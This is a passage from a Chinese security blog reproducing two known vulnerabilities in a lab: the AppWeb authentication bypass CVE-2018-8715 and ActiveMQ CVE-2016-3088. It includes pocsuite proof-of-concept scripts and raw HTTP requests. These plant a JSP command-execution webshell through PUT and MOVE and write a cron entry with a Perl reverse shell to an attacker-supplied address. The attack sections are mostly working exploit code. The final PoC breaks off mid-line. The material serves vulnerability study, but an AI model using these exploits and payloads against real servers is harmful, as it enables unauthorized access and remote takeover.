<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    Get the username and password credentials. If using an in-protocol auth scheme like basic|digest, the</span><br><span class="line">    rx-&gt;authDetails will contain the credentials and the parseAuth callback will be invoked to parse.</span><br><span class="line">    Otherwise, it is expected that &quot;username&quot; and &quot;password&quot; fields are present in the request parameters.</span><br><span class="line">    This is called by authCondition which thereafter calls httpLogin</span><br><span class="line"> *&#x2F;</span><br><span class="line">PUBLIC bool httpGetCredentials(HttpConn *conn, cchar **username, cchar **password)</span><br><span class="line">&#123;</span><br><span class="line">    HttpAuth    *auth;</span><br><span class="line"></span><br><span class="line">    assert(username);</span><br><span class="line">    assert(password);</span><br><span class="line">    *username &#x3D; *password &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">    auth &#x3D; conn-&gt;rx-&gt;route-&gt;auth;</span><br><span class="line">    if (!auth || !auth-&gt;type) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (auth-&gt;type) &#123;</span><br><span class="line">        if (conn-&gt;authType &amp;&amp; !smatch(conn-&gt;authType, auth-&gt;type-&gt;name)) &#123;</span><br><span class="line">            if (!(smatch(auth-&gt;type-&gt;name, &quot;form&quot;) &amp;&amp; conn-&gt;rx-&gt;flags &amp; HTTP_POST)) &#123;</span><br><span class="line">                &#x2F;* If a posted form authentication, ignore any basic|digest details in request *&#x2F;</span><br><span class="line">                return 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (auth-&gt;type-&gt;parseAuth &amp;&amp; (auth-&gt;type-&gt;parseAuth)(conn, username, password) &lt; 0) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        *username &#x3D; httpGetParam(conn, &quot;username&quot;, 0);</span><br><span class="line">        *password &#x3D; httpGetParam(conn, &quot;password&quot;, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数接收两个指向数组的指针用于从请求中解析<code>username</code>和<code>password</code>。既然<code>authCondition</code>没有进行参数检查，那么<code>parseAuth</code>失败也无关紧要。这意味着我们能够插入<code>WWW-Authenticate header</code>或者post任何我们想要的认证数据</p>
<p><code>httpLogin()</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    Login the user and create an authenticated session state store</span><br><span class="line"> *&#x2F;</span><br><span class="line">PUBLIC bool httpLogin(HttpConn *conn, cchar *username, cchar *password)</span><br><span class="line">&#123;</span><br><span class="line">    HttpRx          *rx;</span><br><span class="line">    HttpAuth        *auth;</span><br><span class="line">    HttpSession     *session;</span><br><span class="line">    HttpVerifyUser  verifyUser;</span><br><span class="line"></span><br><span class="line">    rx &#x3D; conn-&gt;rx;</span><br><span class="line">    auth &#x3D; rx-&gt;route-&gt;auth;</span><br><span class="line">    if (!username || !*username) &#123;</span><br><span class="line">        httpTrace(conn, &quot;auth.login.error&quot;, &quot;error&quot;, &quot;msg:&#39;missing username&#39;&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!auth-&gt;store) &#123;</span><br><span class="line">        mprLog(&quot;error http auth&quot;, 0, &quot;No AuthStore defined&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if ((verifyUser &#x3D; auth-&gt;verifyUser) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        if (!auth-&gt;parent || (verifyUser &#x3D; auth-&gt;parent-&gt;verifyUser) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            verifyUser &#x3D; auth-&gt;store-&gt;verifyUser;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!verifyUser) &#123;</span><br><span class="line">        mprLog(&quot;error http auth&quot;, 0, &quot;No user verification routine defined on route %s&quot;, rx-&gt;route-&gt;pattern);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (auth-&gt;username &amp;&amp; *auth-&gt;username) &#123;</span><br><span class="line">        &#x2F;* If using auto-login, replace the username *&#x2F;</span><br><span class="line">        username &#x3D; auth-&gt;username;</span><br><span class="line">        password &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(verifyUser)(conn, username, password)) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(auth-&gt;flags &amp; HTTP_AUTH_NO_SESSION) &amp;&amp; !auth-&gt;store-&gt;noSession) &#123;</span><br><span class="line">        if ((session &#x3D; httpCreateSession(conn)) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            &#x2F;* Too many sessions *&#x2F;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        httpSetSessionVar(conn, HTTP_SESSION_USERNAME, username);</span><br><span class="line">        httpSetSessionVar(conn, HTTP_SESSION_IP, conn-&gt;ip);</span><br><span class="line">    &#125;</span><br><span class="line">    rx-&gt;authenticated &#x3D; 1;</span><br><span class="line">    rx-&gt;authenticateProbed &#x3D; 1;</span><br><span class="line">    conn-&gt;username &#x3D; sclone(username);</span><br><span class="line">    conn-&gt;encoded &#x3D; 0;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一函数会检查username是否为空，当存在session时，password指针可以为空，所以设置空密码指针，即使返回错误，也不会被authCondition检查，允许我们绕过身份验证</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222111637408.png" alt="image-20201222111637408"></p>
<p>用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
<h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line">from pocsuite3.api import Output, POCBase, OptString, register_poc, requests</span><br><span class="line"></span><br><span class="line">class AppWebPoc(POCBase):</span><br><span class="line">	vulID &#x3D; &#39;003&#39;</span><br><span class="line">	version &#x3D; &#39;1.0&#39;</span><br><span class="line">	author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">	vulDate &#x3D; &#39;2020-12-22&#39;</span><br><span class="line">	updateDate &#x3D; &#39;2020-12-22&#39;</span><br><span class="line">	references &#x3D; [&#39;https:&#x2F;&#x2F;ssd-disclosure.com&#x2F;ssd-advisory-appweb-authentication-bypass-digest-and-forms&#x2F;&#39;]</span><br><span class="line">	name &#x3D; &#39;AppWeb CVE-2018-8715&#39;</span><br><span class="line">	appPowerLink &#x3D; &#39;https:&#x2F;&#x2F;www.embedthis.com&#x2F;&#39;</span><br><span class="line">	appName &#x3D; &#39;AppWeb&#39;</span><br><span class="line">	appVersion &#x3D; &#39;&lt;7.0.3&#39;</span><br><span class="line">	vulType &#x3D; &#39;Login Bypass&#39;</span><br><span class="line">	desc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 			session</span><br><span class="line"> 			&#39;&#39;&#39;</span><br><span class="line">	pocDesc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 	pocsuite -r ***.py -u target --verify&quot;</span><br><span class="line"> 	&#39;&#39;&#39;</span><br><span class="line">	samples &#x3D; []</span><br><span class="line">	install_requires &#x3D; []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	def _options(self):</span><br><span class="line">		o &#x3D; OrderedDict()</span><br><span class="line">		o[&quot;username&quot;] &#x3D; OptString(&#39;&#39;, description&#x3D;&#39;这个poc需要用户登录，请输入登录账号&#39;, require&#x3D;True)</span><br><span class="line">		return o</span><br><span class="line"></span><br><span class="line">	def _verify(self):</span><br><span class="line">		result &#x3D; &#123;&#125;</span><br><span class="line">		payload &#x3D; self.get_option(&quot;username&quot;)</span><br><span class="line">		#payload &#x3D; &quot;username&#x3D;&#123;0&#125;&quot;.format(self.get_option(&quot;username&quot;))</span><br><span class="line">		url &#x3D; self.url</span><br><span class="line">		headers&#x3D;&#123;</span><br><span class="line">			&#39;Authorization&#39;:  &#39;Digest username&#x3D;&quot;&#39; +str(payload) +&#39;&quot;&#39;</span><br><span class="line">		&#125;</span><br><span class="line">		# proxies&#x3D;&#123;</span><br><span class="line">		# &#39;http&#39;:&#39;127.0.0.1:8080&#39;,</span><br><span class="line">		# &#39;https&#39;:&#39;127.0.0.1:8080&#39;</span><br><span class="line">		# &#125;</span><br><span class="line">		r &#x3D; requests.get(url, headers&#x3D;headers)</span><br><span class="line">		if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">			result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">			result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; url</span><br><span class="line">			result[&#39;VerifyInfo&#39;][&#39;set-cookie&#39;] &#x3D; r.headers[&#39;set-cookie&#39;]</span><br><span class="line">		return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">	def parse_output(self, result):</span><br><span class="line"> 		output &#x3D; Output(self)</span><br><span class="line"> 		if result:</span><br><span class="line"> 			output.success(result)</span><br><span class="line"> 		else:</span><br><span class="line"> 			output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line"> 		return output</span><br><span class="line"></span><br><span class="line">	def _attack(self):</span><br><span class="line">		return self._verify()</span><br><span class="line"></span><br><span class="line">register_poc(AppWebPoc)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222135500449.png" alt="image-20201222135500449"></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/AppWeb/">AppWeb </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/12/17/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8APOC-CVE-2016-3088/"><i class="fas fa-angle-double-right"></i>ActiveMQ漏洞复现分析以及POC(CVE-2016-3088)</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-12-17</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:51:08.773Z" title="2020-12-23T08:51:08.773Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">10 minutes read (About 1472 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/12/17/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8APOC-CVE-2016-3088/">ActiveMQ漏洞复现分析以及POC(CVE-2016-3088)</a></h1><div class="content"><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>影响版本：Apache ActiveMQ 5.0.0 – 5.13.2<br>ActiveMQ在5.12.x~5.13.x版本中，默认关闭了fileserver这个应用<br>5.14.0版本以后，彻底删除fileserver</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub拉取漏洞环境docker启动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录,下载 <a target="_blank" rel="noopener" href="http://archive.apache.org/dist/activemq/apache-activemq/5.7.0/activemq-parent-5.7.0-source-release.zip">ActiveMQ 5.7.0 源码</a> ，可以看到后台处理 PUT 的关键代码如下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154823813.png" alt="image-20201217154823813"></p>
<p>用户可以上传文件到指定目录，该路径在 <code>conf/jetty.xml</code> 中定义，如下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154544956.png" alt="image-20201217154544956"></p>
<p>顺着 PUT 方法追踪，可以看到调用了如下函数</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217155145859.png" alt="image-20201217155145859"></p>
<p>同时看到后台处理 MOVE 的关键代码如下，可以看到该方法没有对目的路径做任何限制或者过滤。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217155615911.png" alt="image-20201217155615911"></p>
<p>由此，我们可以构造PUT请求上传 webshell 到 fileserver 目录，然后通过 Move 方法将其移动到有执行权限的 admin/ 目录。</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="1-上传webshell"><a href="#1-上传webshell" class="headerlink" title="1.上传webshell"></a>1.上传webshell</h3><p>可以爆破目录(未复现成功)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;test&#x2F;123&#x2F;123 HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Content-Length: 4</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<p>admin 登陆查看目录</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217151345913.png" alt="image-20201217151345913"></p>
<p>首先 PUT 一个  Webshell 的txt到 fileserver 目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Content-Length: 330</span><br><span class="line"></span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> out.print(&quot;Hello&lt;&#x2F;br&gt;&quot;);</span><br><span class="line"> String strcmd&#x3D;request.getParameter(&quot;cmd&quot;);</span><br><span class="line"> String line&#x3D;null;</span><br><span class="line"> Process p&#x3D;Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> BufferedReader br&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"></span><br><span class="line"> while((line&#x3D;br.readLine())!&#x3D;null)&#123;</span><br><span class="line">  out.print(line+&quot;&lt;&#x2F;br&gt;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217151116478.png" alt="image-20201217151116478"></p>
<p>查看发现上传成功</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152139322.png" alt="image-20201217152139322"></p>
<p>由于上传的是文本文件并不能被服务器解析，所以我们下一步要利用MOVE方法将上传的webshell移动到可以执行的目录并更改后缀为jsp。</p>
<p>可以解析jsp文件的路径有：</p>
<p>1．/opt/activemq/webapps/api</p>
<p>2．/opt/activemq/webapps/admin</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;1.jsp</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: JSESSIONID&#x3D;node016s6o5xkj6jyp130d905yk3j4l1.node0</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>这里有一个坑，困惑了我很久，我的方法步骤都没有问题为什么MOVE方法会一直响应超时并且得不到任何响应的内容。尝试了很久，我一度怀疑我的</p>
<p>vulhub环境有问题，一次偶然中我用burp抓到的包去修改执行MOVE方法很快就得到了响应结果，神奇的是把这个数据包重新复制到repeater执行再次出现</p>
<p>响应超时的结果，明明是两个相同的数据包，真是令人费解，有的时候在正常渗透测试过程也会发现这个情况，根据xssle师傅分析可能是MOVE方法不稳定导致的</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152440918.png" alt="image-20201217152440918"></p>
<p>然后访问即可</p>
<p><a target="_blank" rel="noopener" href="http://172.20.10.3:8161/api/1.jsp?cmd=ls">http://172.20.10.3:8161/api/1.jsp?cmd=ls</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152645064.png" alt="image-20201217152645064"></p>
<h3 id="2-计划任务反弹"><a href="#2-计划任务反弹" class="headerlink" title="2.计划任务反弹"></a>2.计划任务反弹</h3><p>写入反弹计划命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 250</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>

<p>这里在命令后面注意把换行符修改为0a，也就是linux中的\n</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201223110657203.png" alt="image-20201223110657203"></p>
<p>移动到/etc/cron.d/目录下，遇到ubuntu目录不太一样，参考<a target="_blank" rel="noopener" href="https://m3lon.github.io/2019/03/18/解决ubuntu-crontab反弹shell失败的问题/">这里</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217153434585.png" alt="image-20201217153434585"></p>
<h3 id="3-写入ssh密钥"><a href="#3-写入ssh密钥" class="headerlink" title="3.写入ssh密钥"></a>3.写入ssh密钥</h3><p>docker未安装ssh未复现，可参考<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/60064.html">这里</a></p>
<h3 id="Metasploit-反弹shell"><a href="#Metasploit-反弹shell" class="headerlink" title="Metasploit 反弹shell"></a>Metasploit 反弹shell</h3><p>进入metasploit，搜索2016-3088</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217153915502.png" alt="image-20201217153915502"></p>
<p>直接淦就完事了</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154031247.png" alt="image-20201217154031247"></p>
<h2 id="poc编写"><a href="#poc编写" class="headerlink" title="poc编写"></a>poc编写</h2><p>根据漏洞的原理进行编写    验证模块PUT成功即可  攻击模块进行MOVE操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pocsuite.net import req</span><br><span class="line">from pocsuite.poc import POCBase,Output</span><br><span class="line">from pocsuite.utils import register</span><br><span class="line"></span><br><span class="line">class ActiveMQPoc(POCBase):</span><br><span class="line">	vulID &#x3D; &#39;002&#39;</span><br><span class="line">	version &#x3D; &#39;1.0&#39;</span><br><span class="line">	author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">	vulDate &#x3D; &#39;2020-12-17&#39;</span><br><span class="line">	updateDate &#x3D; &#39;2020-12-17&#39;</span><br><span class="line">	references &#x3D; [&#39;https:&#x2F;&#x2F;paper.seebug.org&#x2F;346&#x2F;&#39;]</span><br><span class="line">	name &#x3D; &#39;Apache ActiveMQ (CVE-2016-3088)&#39;</span><br><span class="line">	appPowerLink &#x3D; &#39;activemq.apache.org&#39;</span><br><span class="line">	appName &#x3D; &#39;Apache activemq&#39;</span><br><span class="line">	appVersion &#x3D; &#39; Apache ActiveMQ 5.14.0&#39;</span><br><span class="line">	vulType &#x3D; &#39;Arbitrary File Reading&#39;</span><br><span class="line">	desc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 			fileserverfileserverjsp\</span><br><span class="line"> 			MOVEMOVE</span><br><span class="line"> 			&#39;&#39;&#39;</span><br><span class="line">	pocDesc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 	pocsuite -r ***.py -u target --verify&quot;</span><br><span class="line"> 	&#39;&#39;&#39;</span><br><span class="line">	samples &#x3D; []</span><br><span class="line">	install_requires &#x3D; []</span><br><span class="line"></span><br><span class="line">	def _verify(self):</span><br><span class="line"> 		result &#x3D; &#123;&#125;</span><br><span class="line"> 		path &#x3D; &quot;fileserver&#x2F;1.txt&quot;</span><br><span class="line"> 		path1 &#x3D; &quot;api&#x2F;1.jsp?cmd&#x3D;ls&quot;</span><br><span class="line"> 		url &#x3D; self.url + &#39;&#x2F;&#39; + path</span><br><span class="line"> 		try:</span><br><span class="line"> 			resp &#x3D; req.put(url)</span><br><span class="line"> 			resp1 &#x3D; req.get(url)</span><br><span class="line"> 			if (resp.status_code &#x3D;&#x3D; 204 and str(resp1.status_code)[0] in (&#39;2&#39;, &#39;3&#39;)):</span><br><span class="line"> 				result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line"> 				result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; url</span><br><span class="line"></span><br><span class="line"> 		except Exception as ex:</span><br><span class="line"> 			pass</span><br><span class="line"></span><br><span class="line"> 		return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">	def parse_output(self, result):</span><br><span class="line"> 		output &#x3D; Output(self)</span><br><span class="line"> 		if result:</span><br><span class="line"> 			output.success(result)</span><br><span class="line"> 		else:</span><br><span class="line"> 			output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line"> 		return output</span><br><span class="line"></span><br><span class="line">	def _attack(self):</span><br><span class="line">		result &#x3D; &#123;&#125;</span><br><span class="line">		path &#x3D; 